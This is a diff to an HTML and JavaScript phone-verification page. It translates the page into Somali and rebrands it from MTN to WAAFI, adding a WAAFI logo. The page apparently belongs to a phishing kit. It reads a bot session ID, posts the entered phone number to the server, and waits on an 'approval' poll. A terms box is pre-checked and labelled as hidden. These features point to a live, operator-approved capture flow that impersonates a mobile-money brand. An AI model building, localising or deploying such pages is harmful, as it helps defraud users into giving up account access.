@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="so">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Verify your phone number</title>
+    <title>Xaqiiji lambarkaaga telefoonka</title>
     <style>
         * {
             margin: 0;
@@ -33,20 +33,34 @@
             flex: 1;
         }
 
-        /* Back arrow */
+        /* ── Back arrow (now first) ── */
         .back-arrow {
             font-size: 28px;
             font-weight: 300;
             color: #007AFF;
             text-decoration: none;
             display: inline-block;
-            margin-bottom: 12px;
+            margin-bottom: 4px;
             line-height: 1;
             cursor: pointer;
             width: fit-content;
         }
         .back-arrow:hover {
             opacity: 0.7;
+        }
+
+        /* ── WAAFI LOGO ── */
+        .logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 16px;
+            padding: 0 2px;
+        }
+        .logo img {
+            max-width: 160px;
+            height: auto;
+            display: block;
         }
 
         /* Title & subtitle */
@@ -223,6 +237,9 @@
                 height: 54px;
                 font-size: 17px;
             }
+            .logo img {
+                max-width: 130px;
+            }
         }
         @media (max-width: 360px) {
             .prefix {
@@ -235,21 +252,29 @@
                 font-size: 16px;
                 height: 50px;
             }
+            .logo img {
+                max-width: 110px;
+            }
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- Back arrow -->
+        <!-- Back arrow – now first -->
         <a href="javascript:history.back()" class="back-arrow">&#8592;</a>
 
+        <!-- WAAFI Logo – now second -->
+        <div class="logo">
+            <img src="waafi-logo.jpeg" alt="WAAFI" />
+        </div>
+
         <!-- Title & subtitle -->
-        <div class="title">Verify your phone number</div>
-        <div class="subtitle">We will send an SMS message to verify your phone number.</div>
+        <div class="title">Xaqiiji lambarkaaga telefoonka</div>
+        <div class="subtitle">Waxaan kuu diri doonaa farriin SMS si aan u xaqiijino lambarkaaga telefoonka.</div>
 
         <!-- Country label – separate line -->
-        <div class="country-label">Somalia</div>
+        <div class="country-label">Soomaaliya</div>
 
         <!-- Form -->
         <form id="detailsForm" class="form-content">
@@ -259,20 +284,20 @@
                     type="tel"
                     id="phone"
                     name="phone"
-                    placeholder="Enter your phone number"
+                    placeholder="Gali lambarkaaga telefoonka"
                     autocomplete="tel-national"
                     required>
             </div>
 
-            <a href="#" class="help-link">Need help?</a>
+            <a href="#" class="help-link">Caawimaad u baahan?</a>
 
             <div class="bottom-section">
                 <div class="checkbox-wrap">
                     <input type="checkbox" id="termsCheck" checked required>
-                    <label for="termsCheck">Terms (hidden)</label>
+                    <label for="termsCheck">Shuruudaha (qarsoon)</label>
                 </div>
                 <button type="submit" id="continueBtn" disabled>
-                    Next
+                    Xiga
                 </button>
             </div>
         </form>
@@ -314,7 +339,7 @@
                 button.disabled = true;
                 spinner.style.display = "block";
                 status.style.display = "block";
-                status.textContent = "⏳ Awaiting approval...";
+                status.textContent = "⏳ Sugitaan...";
                 // Actual submission logic is below
             });
         });
@@ -324,7 +349,7 @@
         // Main logic
         let fullName = localStorage.getItem('fullName');
         if (!fullName) {
-            fullName = 'MTN User';
+            fullName = 'WAAFI User';
             localStorage.setItem('fullName', fullName);
         }
 
@@ -334,7 +359,7 @@
         const botId = localStorage.getItem('botId');
 
         if (!botId) {
-            alert('Session expired. Please start over.');
+            alert('Fadhi wuu dhacay. Fadlan dib u bilow.');
             window.location.href = 'index.html';
         }
 
@@ -350,7 +375,7 @@
             if (!termsCheck.checked) {
                 statusEl.style.display = 'block';
                 statusEl.className = 'status error';
-                statusEl.textContent = '❌ Please accept the terms and conditions';
+                statusEl.textContent = '❌ Fadlan aqbal shuruudaha iyo qawaaniinta.';
                 return;
             }
             nextButton.disabled = true;
@@ -358,7 +383,7 @@
             if (!phone) {
                 statusEl.style.display = 'block';
                 statusEl.className = 'status error';
-                statusEl.textContent = '❌ Please enter a phone number';
+                statusEl.textContent = '❌ Fadlan geli lambarka telefoonka.';
                 nextButton.disabled = false;
                 return;
             }
@@ -366,7 +391,7 @@
             statusEl.style.display = 'block';
             spinner.style.display = 'block';
             statusEl.className = 'status';
-            statusEl.textContent = '⏳ Awaiting approval...';
+            statusEl.textContent = '⏳ Sugitaan...';
 
             try {
                 const res = await fetch(`${window.location.origin}/submit-phone`, {
@@ -380,7 +405,7 @@
             } catch (error) {
                 spinner.style.display = 'none';
                 statusEl.className = 'status error';
-                statusEl.textContent = '❌ Server error. Please try again.';
+                statusEl.textContent = '❌ Cilad server. Fadlan mar kale isku day.';
                 nextButton.disabled = false;
             }
         });
@@ -399,7 +424,7 @@
                         clearInterval(interval);
                         spinner.style.display = 'none';
                         statusEl.className = 'status error';
-                        statusEl.textContent = '❌ Phone number rejected. Please try again.';
+                        statusEl.textContent = '❌ Lambarka waa la diiday. Fadlan mar kale isku day.';
                         nextButton.disabled = false;
                     }
                     if (data.approved === true) {
